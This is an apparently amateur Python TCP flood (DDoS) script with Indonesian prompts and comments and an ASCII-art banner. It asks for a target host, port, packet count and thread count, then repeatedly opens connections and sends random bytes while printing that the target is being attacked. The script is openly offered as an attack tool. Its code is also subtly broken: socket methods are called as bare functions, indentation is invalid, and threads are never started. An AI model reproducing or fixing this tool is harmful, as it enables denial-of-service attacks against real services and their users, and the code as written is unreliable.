# INI CUMA TCP DOANG BRE
# PRIME XEAMUS

import socket
import random
import threading
import os

def banner(): # Banner
    os.system("cls || clear")
    print(fr"""
                     `. ___
                    __,' __`.                _..----....____
        __...--.'``;.   ,.   ;``--..__     .'    ,-._    _.-'
  _..-''-------'   `'   `'   `'     O ``-''._   (,;') _,'
,'________________                          \`-._`-','
 `._              ```````````------...___   '-.._'-:
    ```--.._      ,.                     ````--...__\-.
            `.--. `-`                       ____    |  |`
              `. `.                       ,'`````.  ;  ;`
                `._`.        __________   `.      \'__/`
                   `-:._____/______/___/____`.     \  `
                               |       `._    `.    \
                               `._________`-.   `.   `.___
                                                  `------'` 
 """)

ip = str(input('[+] Masukan Ip/Host Target: '))
port = int(input('[+] Masukan Port Target: '))
packet = int(input('[+] Masukan Jumlah Paket: '))
thread = int(input('[+] Masukan Jumlah Threads: '))

def DDOS():
	Xeamus = random._urandom(1020)
	xx = int(0)
	while True:
		try:
		     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		     s = connect((ip,port))
		     s = send(Xeamus)
		     for i in range(packet):
			       s.send(Xeamus)
			 xx += random.randint(0, int(packet))
			 print('Menyerang '+ip+'  |  Sent:  '+str(xx))
        except:
       	   s.close()
           print(' Udah Down Cok ')

 for x in range(thread):
	 thred = threading.Thread(target=DDOS)
	 thred.DDOS()